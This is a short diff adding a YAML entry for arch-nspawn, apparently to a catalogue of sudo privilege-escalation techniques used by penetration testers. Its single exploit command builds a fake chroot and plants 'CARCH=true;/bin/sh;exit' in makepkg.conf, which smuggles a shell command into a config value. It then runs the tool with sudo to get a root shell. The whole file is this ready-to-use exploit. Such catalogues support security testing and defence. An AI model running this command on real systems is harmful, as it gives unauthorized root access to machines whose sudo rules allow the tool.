@@ -1,0 +1,6 @@
+name: arch-nspawn
+binary_path: /usr/bin/arch-nspawn
+exploit_cmds:
+- mkdir -p ./etc/ && grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh
+  >.arch-chroot && touch ./etc/pacman.conf && echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
+  && sudo /usr/bin/arch-nspawn .
